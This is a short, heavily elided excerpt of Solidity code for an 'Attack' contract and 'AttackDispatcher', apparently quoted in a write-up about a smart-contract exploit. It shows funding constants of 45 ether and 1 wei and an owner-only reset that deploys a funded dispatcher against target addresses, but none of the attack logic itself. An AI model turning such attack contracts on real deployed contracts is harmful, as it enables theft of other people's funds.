 ...
 * parameter. Make sure to send at least 45 ether and 1 wei to the attack
    ...
    function _dispatch() public returns(bool) {
        ...
        if (state == 0) {
            if (id == 4) {
                ...
                uint value = 0x270801d946c940000;
...
contract Attack is AttackManager {
    ...
    uint constant REQUIRED_BUDGET = 0x270801d946c940001; /* equals 45 ether and 1 wei */
    ...
    function reset(address payable[] memory _targets) public onlyOwner payable {
        ...
        rstate_state = 0;
        rstate[0] = 0;
        subs[4] = new AttackDispatcher{value: 45000000000000000000 }(4, _targets);
    }
